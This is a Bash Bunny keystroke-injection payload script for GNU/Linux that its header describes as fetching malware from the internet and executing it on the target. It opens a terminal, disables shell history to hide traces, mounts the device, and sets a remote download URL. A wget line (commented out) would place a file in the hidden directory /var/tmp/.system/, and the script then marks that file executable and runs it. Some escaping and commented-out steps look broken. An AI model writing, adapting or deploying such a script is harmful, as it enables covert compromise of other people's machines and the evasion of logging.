# Title: malware_exec
# Description: malware_exec fetches malware hosted on Internet and executes it on targets system. malware_exec can make malware persistent and can autorun.
# AUTHOR: drapl0n
# Version: 1.0
# Category: Execution
# Target: GNU/Linux.
# Attackmodes: HID, Storage.

LED SETUP
ATTACKMODE STORAGE HID
GET SWITCH_POSITION
LED ATTACK
Q DELAY 1000
Q CTRL-ALT t
Q DELAY 1000

# [Prevent storing history]
Q STRING unset HISTFILE
Q ENTER
Q DELAY 200

# [Fetching BashBunny's block device]
Q STRING disk='$(lsblk -fs | grep BashBunny | awk '\'{print\ '$1'}\'\)''
Q ENTER
Q DELAY 200

# [Mounting BashBunny]
Q STRING udisksctl mount -b /dev/'$disk'
Q ENTER
Q DELAY 2000
Q STRING lmnt='$(lsblk | grep $disk | awk '\'{print\ '$7'}\'\)''
Q ENTER
Q DELAY 500

# [Fetching malware]
Q STRING url=https://raw.githubusercontent.com/drapl0n/temp/main/malware_exec
Q ENTER
Q DELAY 200
#Q STRING mkdir -p /var/tmp/.system/ \&\& wget '$url' -O /var/tmp/.system/sys
Q ENTER
# [change delay time below according to file size]
Q DELAY 5000
Q STRING chmod +x /var/tmp/.system/sys
Q ENTER

# [transfering payload script]
# Q STRING cp -r '$lmnt'/payloads/library/malware_exec/payload.sh /tmp/
# Q ENTER
# Q STRING chmod +x /tmp/payload.sh
# Q ENTER
# Q STRING /tmp/./payload.sh
# Q ENTER
# Q DELAY 1500
# Q STRING rm /tmp/payload.sh
# Q ENTER
# Q DELAY 500

# [Unmounting BashBunny]
Q STRING udisksctl unmount -b /dev/'$disk'
Q ENTER
Q DELAY 500

# [Executing Malware]
Q DELAY 100
Q STRING /var/tmp/.system/./sys /&/& exit
Q ENTER

LED FINISH
